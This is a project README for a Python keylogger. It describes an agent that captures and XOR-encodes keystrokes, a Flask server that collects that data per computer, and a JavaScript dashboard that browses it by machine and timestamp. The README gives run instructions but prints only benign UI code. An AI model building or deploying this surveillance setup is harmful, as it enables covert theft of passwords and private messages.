# KeyLogger-2.0

## Description
KeyLogger-2.0 is a Python-based keylogger that captures keystrokes, encrypts the data, and writes it to a file. It is designed for educational purposes and should be used responsibly.

## Features
- Captures keystrokes
- Encrypts captured data using XOR encryption
- Writes encrypted data to a file
- Periodically resets and writes data to a dictionary

## Installation
1. Clone the repository:
    ```sh
    git clone https://github.com/yourusername/KeyLogger-2.0.git
    ```
2. Navigate to the project directory:
    ```sh
    cd KeyLogger-2.0/KeyLoggerAgent
    ```
3. Install the required dependencies:
    ```sh
    pip install -r requirements.txt
    ```

## Usage
1. Run the [manager.py](https://github.com/ItzchakSklar/KeyLogger-2.0/blob/main/KeyLoggerAgent/manager.py) script to start the keylogger:
    ```sh
    python manager.py
    ```
2. The keylogger will start capturing keystrokes and writing encrypted data to the specified file.

## KeyLoggerAgent

### Classes

#### `IWriter`
An abstract base class for writers with a `write` method that must be implemented by subclasses.

#### `DictWriter`
A class that writes data to a dictionary, with minutes as keys and text as values.
- **Methods:**
  - `write(data: list) -> None`: Writes the given list of characters to the dictionary.
  - `get_dict() -> dict`: Resets the dictionary and returns the last dictionary.
  - `cur_min() -> str`: Returns the current minute as a string.

#### `FileWriter`
A class that writes data to a text file.
- **Methods:**
  - `write(data: str) -> None`: Writes the given string to the file.

## Server Side
# Flask API for Computer Data Management

## Overview

This Flask-based API allows storing and retrieving encrypted computer data. It provides endpoints for adding, retrieving, and managing data stored in files.

## Features

- Store data for different computers
- Retrieve stored data
- Retrieve available computer names
- Retrieve timestamps and specific time-based data
- Uses simple encryption for stored data
- CORS enabled

## Requirements

Ensure you have Python installed, then install dependencies using:

```bash
pip install flask flask-cors
```

## Running the Server

Run the following command to start the server:

```bash
python app.py
```

The API will be accessible at `http://127.0.0.1:5000/`

## API Endpoints

### 1. Store Data for a Computer

**Endpoint:** `POST /api/computers/<computer_name>`\
**Description:** Appends data to the file associated with a specific computer.\
**Request Body:** Raw text data (encrypted format expected).\
**Response:** `{ "message": "File updated successfully" }`

### 2. Get All Computers

**Endpoint:** `GET /api/computers`\
**Description:** Returns a list of all available computer names.\
**Response:** `["computer1", "computer2", ...]`

### 3. Get Data for a Computer

**Endpoint:** `GET /api/computers/<computer_name>`\
**Description:** Retrieves and decrypts stored data for a given computer.\
**Response:** `{ timestamp: "data" }`

### 4. Get All Available Timestamps for a Computer

**Endpoint:** `GET /api/computers/<computer_name>/times`\
**Description:** Returns a list of timestamps available for a computer.\
**Response:** `["timestamp1", "timestamp2", ...]`

### 5. Get Data for a Specific Timestamp

**Endpoint:** `GET /api/computers/<computer_name>/<time>`\
**Description:** Retrieves stored data for a given computer at a specific timestamp.\
**Response:** `"data"`

## File Structure

```
project_folder/
│-- data/  # Directory storing computer data files
│-- app.py  # Flask API implementation
│-- README.md  # Project documentation
```

## Notes

- Data is stored as plaintext in the `data/` folder.
- Ensure `data/` directory exists before running the server.
- The encryption used is a simple XOR operation (not secure for sensitive data).

## Client Side
# Flask API Client-Side (Frontend)

## Overview
This JavaScript-based frontend interacts with the Flask API to manage computer data. It provides functionality for fetching, displaying, searching, and updating computer records.

## Features
- Fetch and display a list of computers
- View detailed data of a selected computer
- Search for computers by name or data
- Update computer names
- Display success and error notifications

## Requirements
- A running Flask backend (`app.py`)
- A web browser to open the frontend

## API Configuration
The frontend communicates with the Flask API via the following base URL:
```javascript
const API_URL = 'http://127.0.0.1:5000/api';
```

## File Structure
```
project_folder/
│-- index.html  # Main frontend file
│-- styles.css  # Styles for the UI
│-- script.js  # JavaScript logic
│-- README.md  # Documentation
```

## Usage
### 1. Fetch and Display Computers
Computers are fetched from the API and displayed as a list:
```javascript
async function fetchComputers() {
    const response = await fetch(`${API_URL}/computers`);
    const computers = await response.json();
    renderComputersList(computers);
}
```

### 2. Fetch and Display Computer Details
When a user clicks on a computer, its details are fetched and displayed:
```javascript
async function fetchComputerDetails(computerName) {
    const response = await fetch(`${API_URL}/computers/${computerName}`);
    const computer = await response.json();
    renderComputerDetails(computer, computerName);
}
```

### 3. Search Functionality
Users can search for computers by name or data:
```javascript
function handleSearch(event) {
    const searchTerm = event.target.value.toLowerCase();
    document.querySelectorAll('.computer-item').forEach(item => {
        const name = item.querySelector('.computer-name').textContent.toLowerCase();
        item.style.display = name.includes(searchTerm) ? '' : 'none';
    });
}
```

### 4. Update Computer Name
A modal allows users to update a computer's name:
```javascript
async function updateComputerName(computerName, newName) {
    const response = await fetch(`${API_URL}/computers/${computerName}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: newName })
    });
    return await response.json();
}
```

### 5. Notifications
Success and error messages are displayed as notifications:
```javascript
function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 5000);
}
```

## Notes
- Ensure the Flask server is running before interacting with the frontend.
- The frontend uses JavaScript to dynamically update the UI.
- The project can be extended with a proper UI framework for better design.

##Authors

Itzchak Sklar - Developer (GitHub https://github.com/ItzchakSklar)

david avishay landau - Developer (GitHub https://github.com/davidlandau770)

shemaryahuz - Developer (GitHub https://github.com/shemaryahuz)

If you contributed to this project, feel free to add yourself to the list!

## Contributing
Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

